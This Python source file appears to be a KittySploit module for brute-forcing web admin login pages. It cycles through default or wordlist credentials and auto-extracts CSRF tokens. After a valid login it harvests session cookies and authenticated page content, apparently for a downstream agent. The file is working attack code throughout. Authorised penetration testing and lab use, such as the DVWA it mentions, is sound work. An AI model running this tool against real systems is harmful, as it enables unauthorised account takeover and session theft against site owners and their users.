#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import os
import re
from urllib.parse import parse_qsl, urlparse


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'Admin Login Bruteforce',
        'description': 'Bruteforce an admin login page with username/password wordlists.',
        'author': 'KittySploit Team',
        'tags': ['web', 'scanner', 'login', 'bruteforce', 'admin'],
    }

    path = OptString("/admin/login", "Path to the login page", required=True)
    method = OptString("POST", "HTTP method for login submit (POST/GET)", required=False, advanced=True)

    username_field = OptString("username", "Username field name", required=True)
    password_field = OptString("password", "Password field name", required=True)
    extra_fields = OptString("", "Extra fields (query string format: k=v&k2=v2)", required=False, advanced=True)

    usernames_file = OptFile("", "File with usernames (one per line)", required=False)
    passwords_file = OptFile("", "File with passwords (one per line)", required=False)
    username = OptString("", "Single username (optional)", required=False)
    password = OptString("", "Single password (optional)", required=False)

    csrf_field = OptString("", "CSRF field name (empty = auto-detect)", required=False, advanced=True)
    success_regex = OptString("dashboard|logout|administration|welcome", "Regex indicating successful login", required=False, advanced=True)
    failure_regex = OptString("invalid|incorrect|failed|erreur|denied|wrong", "Regex indicating failed login", required=False, advanced=True)
    follow_redirects_after_login = OptBool(False, "Follow redirects after login submit", required=False, advanced=True)
    use_failure_baseline = OptBool(True, "Compare responses against a known failed login", required=False, advanced=True)
    baseline_mode = OptString(
        "surface",
        "Baseline strategy: surface=compare post-login page after redirects (best for DVWA/302 PRG); "
        "headers=compare first response only (legacy)",
        required=False,
        advanced=True,
    )
    post_login_probe = OptBool(
        True,
        "After a candidate success, re-submit with redirects enabled and capture landing page for the agent",
        required=False,
        advanced=True,
    )

    stop_on_success = OptBool(True, "Stop after first valid credentials", required=False)
    max_attempts = OptInteger(10, "Maximum number of attempts", required=False, advanced=True)

    def check(self):
        try:
            response = self.http_request(
                method="GET",
                path=self.path,
                allow_redirects=True
            )
            if response and response.status_code in [200, 301, 302, 401, 403]:
                return True
            print_error("Unable to reach login page.")
            return False
        except Exception as e:
            print_error(f"Check failed: {e}")
            return False

    def _normalize_path(self, value):
        value = (value or "").strip()
        if not value:
            return "/"
        if not value.startswith("/"):
            value = f"/{value}"
        return value

    def _read_wordlist(self, file_path):
        values = []
        if not file_path:
            return values
        if not os.path.isfile(file_path):
            print_warning(f"Wordlist not found: {file_path}")
            return values
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    item = line.strip()
                    if item and not item.startswith("#"):
                        values.append(item)
        except Exception as e:
            print_warning(f"Unable to read wordlist {file_path}: {e}")
        return values

    def _build_candidates(self):
        default_users = ["admin", "administrator", "root"]
        default_passwords = ["admin", "password", "123456", "admin123", "root"]

        users = []
        passwords = []

        if self.username:
            users.append(self.username.strip())
        users.extend(self._read_wordlist(self.usernames_file))

        if self.password:
            passwords.append(self.password.strip())
        passwords.extend(self._read_wordlist(self.passwords_file))

        if not users:
            users = default_users
            print_warning("No username source provided, using built-in defaults.")
        if not passwords:
            passwords = default_passwords
            print_warning("No password source provided, using built-in defaults.")

        users = list(dict.fromkeys([u for u in users if u]))
        passwords = list(dict.fromkeys([p for p in passwords if p]))
        return users, passwords

    def _extra_fields_dict(self):
        extra = {}
        if self.extra_fields:
            for key, value in parse_qsl(self.extra_fields, keep_blank_values=True):
                extra[key] = value
        return extra

    def _extract_csrf(self, html):
        if not html:
            return None, None

        if self.csrf_field:
            pattern = r'<input[^>]+name=["\']%s["\'][^>]+value=["\']([^"\']*)["\']' % re.escape(self.csrf_field)
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return self.csrf_field, match.group(1)

        auto_patterns = [
            r'<input[^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken|authenticity_token)["\']',
        ]

        for pattern in auto_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                if len(match.groups()) == 2 and match.group(1) and match.group(2):
                    if match.group(1).lower() in ["_token", "csrf_token", "csrfmiddlewaretoken", "authenticity_token"]:
                        return match.group(1), match.group(2)
                    return match.group(2), match.group(1)

        # Generic fallback for custom token names (ex: user_token, login_token, form_token).
        generic_token_patterns = [
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']*(?:token|csrf|nonce)[^"\']*)["\'][^>]+value=["\']([^"\']*)["\']',
            r'<input[^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']*)["\'][^>]+name=["\']([^"\']*(?:token|csrf|nonce)[^"\']*)["\']',
        ]

        for pattern in generic_token_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                # Handle both name-first and value-first variants.
                g1 = (match.group(1) or "").strip()
                g2 = (match.group(2) or "").strip()
                if any(keyword in g1.lower() for keyword in ["token", "csrf", "nonce"]):
                    return g1, g2
                return g2, g1

        return None, None

    def _extract_form_default_fields(self, html):
        """
        Extract default fields from login form (hidden + submit controls).
        This helps with apps that require additional POST keys such as:
        - hidden anti-CSRF/user_token fields
        - submit button values (e.g. Login=Login)
        """
        defaults = {}
        if not html:
            return defaults

        # Hidden inputs: <input type='hidden' name='x' value='y'>
        hidden_pattern = (
            r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
            r'|<input[^>]+type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']'
        )
        for match in re.finditer(hidden_pattern, html, re.IGNORECASE):
            name = (match.group(1) or match.group(4) or "").strip()
            value = (match.group(2) or match.group(3) or "").strip()
            if name:
                defaults[name] = value

        # Submit inputs: <input type='submit' value='Login' name='Login'>
        submit_pattern = (
            r'<input[^>]+type=["\']submit["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
            r'|<input[^>]+type=["\']submit["\'][^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']'
        )
        for match in re.finditer(submit_pattern, html, re.IGNORECASE):
            name = (match.group(1) or match.group(4) or "").strip()
            value = (match.group(2) or match.group(3) or "").strip()
            if name and name not in defaults:
                defaults[name] = value if value else "1"

        return defaults

    def _response_signature(self, response, login_path):
        body = (response.text or "").lower() if response else ""
        location = (response.headers.get("Location", "") or "").lower() if response else ""
        set_cookie = (response.headers.get("Set-Cookie", "") or "").lower() if response else ""
        status_code = response.status_code if response else 0

        has_failure = bool(re.search(self.failure_regex, body, re.IGNORECASE)) if self.failure_regex else False
        has_success = bool(re.search(self.success_regex, body, re.IGNORECASE)) if self.success_regex else False

        login_markers = bool(re.search(r'(login|sign in|connexion|mot de passe|password)', body, re.IGNORECASE))
        redirected_away = False
        if status_code in [301, 302, 303, 307, 308] and location:
            redirected_away = login_path.lower() not in location

        auth_cookie_markers = [
            "logged_in", "auth", "token", "jwt", "sessionid", "connect.sid",
            "phpsessid", "jsessionid", "asp.net_sessionid", "sid=",
        ]
        has_auth_cookie = any(marker in set_cookie for marker in auth_cookie_markers)

        return {
            "status": status_code,
            "location": location,
            "location_path": self._location_path(location),
            "has_failure": has_failure,
            "has_success": has_success,
            "login_markers": login_markers,
            "redirected_away": redirected_away,
            "has_auth_cookie": has_auth_cookie,
            "body_len": len(body),
        }

    def _location_path(self, location_value):
        if not location_value:
            return ""
        try:
            parsed = urlparse(location_value)
            if parsed.path:
                return parsed.path.lower()
            # Relative URL without scheme/host.
            if location_value.startswith("/"):
                return location_value.split("?", 1)[0].lower()
            return location_value.lower().split("?", 1)[0]
        except Exception:
            return location_value.lower().split("?", 1)[0]

    def _is_success(self, response, login_path, baseline_signature=None):
        if not response:
            return False

        body = (response.text or "").lower()
        signature = self._response_signature(response, login_path)
        is_redirect = signature["status"] in [301, 302, 303, 307, 308]

        if signature["has_failure"]:
            return False

        # If we have a baseline, evaluate against it first to avoid false positives
        # on applications that always return 302 after POST.
        if baseline_signature:
            baseline_is_redirect = baseline_signature.get("status") in [301, 302, 303, 307, 308]

            # Same redirect pattern as failed login => not a success by itself.
            if is_redirect and baseline_is_redirect:
                same_redirect_target = (
                    signature.get("location_path", "") == baseline_signature.get("location_path", "")
                )
                if same_redirect_target and not signature["has_auth_cookie"]:
                    return False

            # Redirect target path changed vs baseline (ignore query-string/token noise).
            if signature.get("location_path") and (
                signature.get("location_path") != baseline_signature.get("location_path", "")
            ):
                return True

            # Status change alone is too weak (many apps always return 302). Require stronger signals.
            if signature["status"] != baseline_signature.get("status"):
                if signature["has_auth_cookie"] and not baseline_signature.get("has_auth_cookie"):
                    if signature["status"] in [200, 204, 301, 302, 303, 307, 308]:
                        return True
                if signature.get("location_path") and (
                    signature.get("location_path") != baseline_signature.get("location_path", "")
                ):
                    if signature["status"] in [200, 204, 301, 302, 303, 307, 308]:
                        return True

            # Failure marker disappears and login markers also disappear => likely authenticated page.
            if baseline_signature.get("has_failure") and not signature["has_failure"] and not signature["login_markers"]:
                return True

            # Auth cookie appears only after candidate login.
            if signature["has_auth_cookie"] and not baseline_signature.get("has_auth_cookie"):
                return True

            # Body size strongly differs from baseline (dashboard vs login form).
            baseline_len = baseline_signature.get("body_len", 0)
            current_len = signature.get("body_len", 0)
            if baseline_len > 0:
                delta = abs(current_len - baseline_len) / float(baseline_len)
                if delta >= 0.35 and not signature["login_markers"]:
                    return True

        if signature["has_success"]:
            return True

        # Successful auth often returns a redirect away from the login page.
        # Only use this heuristic when no baseline is available.
        if signature["redirected_away"] and not baseline_signature:
            return True

        # Some apps return 200 with auth/session cookies on successful login.
        if signature["status"] == 200 and signature["has_auth_cookie"]:
            # Avoid false positives when the login page itself is returned again.
            if not re.search(r'(login|sign in|connexion)', body, re.IGNORECASE):
                return True

        if "logout" in body and "login" not in body:
            return True

        return False

    def _success_from_baseline_surface(self, baseline_stuck, candidate_stuck):
        """
        DVWA and many PHP apps: failed login => 302 => still login form with error.
        Success => 302 => index/dashboard without password field.
        Same Location on 302 would fool header-only comparison; surface compare fixes that.
        """
        if baseline_stuck is None:
            return False
        return bool(baseline_stuck) and not bool(candidate_stuck)

    def _attempt_login(self, username, password, login_path, extra_fields, baseline_signature=None, allow_redirects=None):
        try:
            follow = self.follow_redirects_after_login if allow_redirects is None else allow_redirects
            pre_resp = self.http_request(
                method="GET",
                path=login_path,
                session=True,
                allow_redirects=True
            )
            csrf_name, csrf_value = self._extract_csrf(pre_resp.text if pre_resp else "")
            form_defaults = self._extract_form_default_fields(pre_resp.text if pre_resp else "")

            data = {}
            data.update(form_defaults)
            data.update(extra_fields)
            data[self.username_field] = username
            data[self.password_field] = password
            if csrf_name and csrf_value is not None:
                data[csrf_name] = csrf_value

            method = (self.method or "POST").upper()
            if method == "GET":
                response = self.http_request(
                    method="GET",
                    path=login_path,
                    params=data,
                    session=True,
                    allow_redirects=follow
                )
            else:
                response = self.http_request(
                    method="POST",
                    path=login_path,
                    data=data,
                    session=True,
                    allow_redirects=follow
                )

            return self._is_success(response, login_path, baseline_signature=baseline_signature), response
        except Exception as e:
            print_debug(f"Attempt failed for {username}:{password} -> {e}")
            return False, None

    def _login_path_token(self, login_path):
        norm = self._normalize_path(login_path).lower().strip("/")
        return norm.split("/")[-1] if norm else ""

    def _looks_like_stuck_on_login_page(self, response, login_path):
        if not response:
            return True
        body = (response.text or "").lower()
        try:
            final_path = urlparse(response.url or "").path.lower()
        except Exception:
            final_path = ""
        token = self._login_path_token(login_path)
        if token and token in final_path and ('type="password"' in body or "type='password'" in body):
            return True
        if self.failure_regex and re.search(self.failure_regex, body, re.IGNORECASE):
            return True
        return False

    def _extract_session_cookies(self, response):
        cookie_jar = None
        if response and hasattr(response, "session"):
            cookie_jar = getattr(response.session, "cookies", None)
        if cookie_jar is None:
            cookie_jar = getattr(self.session, "cookies", None)

        cookies = {}
        if not cookie_jar:
            return cookies

        try:
            for cookie in list(cookie_jar):
                name = str(getattr(cookie, "name", "")).strip()
                value = str(getattr(cookie, "value", "")).strip()
                if not name or not value:
                    continue
                cookies[name[:80]] = value[:512]
                if len(cookies) >= 20:
                    break
        except Exception:
            return {}
        return cookies

    def _build_auth_detail_payload(self, username, password, login_path, response, snippet):
        final_url = getattr(response, "url", "") or "" if response else ""
        try:
            final_path = urlparse(final_url).path or ""
        except Exception:
            final_path = ""

        cookies = self._extract_session_cookies(response)
        payload = {
            "authenticated_as": username,
            "username": username,
            "password": password,
            "login_path": login_path,
            "username_field": self.username_field,
            "password_field": self.password_field,
            "extra_fields": self.extra_fields or "",
            "post_login_final_url": final_url[:512],
            "post_login_snippet": (snippet or "")[:8000],
        }

        if final_path:
            payload["post_login_final_path"] = final_path[:256]
        if cookies:
            payload["session_cookies"] = cookies
            payload["cookie_header"] = "; ".join(
                f"{key}={value}" for key, value in cookies.items()
            )[:4000]
        return payload

    def _probe_authenticated_session(self, username, password, login_path, extra_fields, initial_response=None):
        """
        Re-submit with redirects enabled and require a landing that is not the login form.
        Populates vulnerability_info for downstream agent keyword / module matching.
        """
        if not self.post_login_probe:
            body = (initial_response.text or "")[:8000] if initial_response else ""
            self.vulnerability_info = {
                "reason": f"Credentials {username} accepted (post-login probe disabled)",
                "severity": "High",
            }
            self.vulnerability_info.update(
                self._build_auth_detail_payload(
                    username, password, login_path, initial_response, body
                )
            )
            return True, initial_response

        # Already followed redirects (e.g. surface baseline mode): no second POST needed.
        # Do not treat empty 302 bodies as "landed" — need a real page or non-login surface.
        if initial_response:
            body = initial_response.text or ""
            body_len = len(body)
            not_stuck = not self._looks_like_stuck_on_login_page(initial_response, login_path)
            looks_like_final_page = initial_response.status_code in [200, 201, 204] or body_len > 300
            if not_stuck and looks_like_final_page:
                snippet = body[:8000]
                final_url = getattr(initial_response, "url", "") or ""
                print_success(f"Post-login landing (from attempt): {final_url}")
                print_info(f"Captured HTML sample ({len(snippet)} chars) for agent keyword matching.")
                self.vulnerability_info = {
                    "reason": f"Authenticated as {username}; landing {final_url}",
                    "severity": "High",
                }
                self.vulnerability_info.update(
                    self._build_auth_detail_payload(
                        username, password, login_path, initial_response, snippet
                    )
                )
                return True, initial_response

        print_status("Verifying session: following post-login redirects...")
        ok, response = self._attempt_login(
            username,
            password,
            login_path,
            extra_fields,
            baseline_signature=None,
            allow_redirects=True,
        )
        if not response:
            print_warning("Post-login probe: no response.")
            return False, None

        if self._looks_like_stuck_on_login_page(response, login_path):
            print_warning("Post-login probe: still on login surface (not treating as authenticated).")
            return False, response

        body = response.text or ""
        snippet = body[:8000]
        final_url = getattr(response, "url", "") or ""
        print_success(f"Post-login landing: {final_url}")
        print_info(f"Captured HTML sample ({len(snippet)} chars) for agent keyword matching.")

        self.vulnerability_info = {
            "reason": f"Authenticated as {username}; landing {final_url}",
            "severity": "High",
        }
        self.vulnerability_info.update(
            self._build_auth_detail_payload(
                username, password, login_path, response, snippet
            )
        )
        return True, response

    def _resolve_login_path_after_redirects(self, requested_path: str) -> str:
        """
        GET may start on ``/`` while the real form lives at ``/login.php`` after HTTP redirects.
        Align bruteforce POSTs with the final URL path (``requests`` exposes it via ``response.url``).
        """
        req = self._normalize_path(requested_path)
        try:
            probe = self.http_request(method="GET", path=req, allow_redirects=True)
        except Exception:
            return req
        if not probe:
            return req
        effective = self.response_effective_path(req, probe)
        eff_norm = self._normalize_path(effective)
        if eff_norm != req:
            print_info(f"Login path resolved after redirects: {req} -> {eff_norm}")
            try:
                self.set_option("path", eff_norm)
            except Exception:
                pass
        return eff_norm

    def run(self):
        login_path = self._resolve_login_path_after_redirects(self.path)
        users, passwords = self._build_candidates()
        extra_fields = self._extra_fields_dict()

        total = len(users) * len(passwords)
        if self.max_attempts > 0:
            total = min(total, self.max_attempts)

        attempts = 0
        found = []
        baseline_signature = None
        baseline_stuck_on_login = None
        use_surface_baseline = (
            self.use_failure_baseline
            and (self.baseline_mode or "surface").lower().strip() == "surface"
        )

        if self.use_failure_baseline:
            invalid_user = "__kittysploit_invalid_user__"
            invalid_pass = "__kittysploit_invalid_pass__"

            if use_surface_baseline:
                print_status(
                    "Building failure baseline (post-login page after redirects; good for 302 PRG apps like DVWA)..."
                )
                _, baseline_follow = self._attempt_login(
                    invalid_user,
                    invalid_pass,
                    login_path,
                    extra_fields,
                    baseline_signature=None,
                    allow_redirects=True,
                )
                if baseline_follow:
                    # GET / may stay on ``/`` while POST login redirects to ``/login.php`` (302/PRG).
                    eff = self._normalize_path(
                        self.response_effective_path(login_path, baseline_follow)
                    )
                    if eff != login_path:
                        print_info(
                            f"Login path aligned with POST redirect chain: {login_path} -> {eff}"
                        )
                        login_path = eff
                        try:
                            self.set_option("path", login_path)
                        except Exception:
                            pass
                    baseline_stuck_on_login = self._looks_like_stuck_on_login_page(
                        baseline_follow, login_path
                    )
                    final_u = getattr(baseline_follow, "url", "") or ""
                    print_info(
                        f"Baseline ready: stuck_on_login_surface={baseline_stuck_on_login} final_url={final_u[:120]}"
                    )
                    if not baseline_stuck_on_login:
                        print_warning(
                            "Invalid-credentials probe did not land on a login surface; "
                            "surface compare is unreliable. Falling back to header-only baseline."
                        )
                        use_surface_baseline = False
                else:
                    print_warning("Unable to build surface baseline, falling back to header baseline.")
                    use_surface_baseline = False

            if not use_surface_baseline:
                print_status("Building failure baseline with known-invalid credentials (first response only)...")
                _, baseline_resp = self._attempt_login(
                    invalid_user,
                    invalid_pass,
                    login_path,
                    extra_fields,
                    baseline_signature=None,
                    allow_redirects=False,
                )
                if baseline_resp:
                    baseline_signature = self._response_signature(baseline_resp, login_path)
                    print_info(
                        f"Baseline ready (status={baseline_signature['status']}, "
                        f"failure_marker={baseline_signature['has_failure']})"
                    )
                else:
                    print_warning("Unable to build baseline, continuing without it.")
            print_info("")

        print_status(f"Target: {self.target}:{self.port}")
        print_status(f"Login path: {login_path}")
        print_status(f"Candidates: {len(users)} users x {len(passwords)} passwords")
        print_status(f"Max attempts: {self.max_attempts}")
        print_info("")

        for user in users:
            for pwd in passwords:
                if self.max_attempts > 0 and attempts >= self.max_attempts:
                    print_warning("Reached max_attempts limit.")
                    break

                attempts += 1
                print_status(f"[{attempts}/{total}] Trying {user}:{pwd}")

                success = False
                response = None

                if use_surface_baseline and baseline_stuck_on_login is not None:
                    _, response = self._attempt_login(
                        user,
                        pwd,
                        login_path,
                        extra_fields,
                        baseline_signature=None,
                        allow_redirects=True,
                    )
                    candidate_stuck = self._looks_like_stuck_on_login_page(response, login_path) if response else True
                    success = self._success_from_baseline_surface(baseline_stuck_on_login, candidate_stuck)
                    if response and not success:
                        # Fallback: header/signature heuristics when surface ambiguous (e.g. API JSON).
                        sig = self._response_signature(response, login_path)
                        success = self._is_success(response, login_path, baseline_signature=baseline_signature)
                else:
                    success, response = self._attempt_login(
                        user,
                        pwd,
                        login_path,
                        extra_fields,
                        baseline_signature=baseline_signature,
                        allow_redirects=False,
                    )

                if success:
                    verified, probe_resp = self._probe_authenticated_session(
                        user, pwd, login_path, extra_fields, initial_response=response
                    )
                    if not verified:
                        print_warning(f"Discarding false positive for {user}:{pwd} (probe failed).")
                        continue
                    code = probe_resp.status_code if probe_resp else (response.status_code if response else "n/a")
                    print_success(f"Valid credentials found: {user}:{pwd} (status={code})")
                    found.append([user, pwd, code])
                    if self.stop_on_success:
                        print_table(["Username", "Password", "HTTP"], found)
                        return True
            else:
                continue
            break

        if found:
            print_success(f"Found {len(found)} valid credential set(s).")
            print_table(["Username", "Password", "HTTP"], found)
            return True

        print_error("No valid credentials found.")
        return False
